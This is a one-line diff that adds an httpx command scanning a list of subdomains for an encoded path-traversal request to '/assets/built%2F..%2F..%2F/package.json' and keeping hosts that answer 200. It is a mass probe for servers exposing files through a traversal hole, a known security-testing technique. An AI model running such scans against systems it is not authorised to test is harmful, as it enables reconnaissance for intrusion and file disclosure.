@@ -1,0 +1,1 @@
+httpx -l subs.txt -path "/assets/built%2F..%2F.. %2F/package.json" -status-code -mc 200
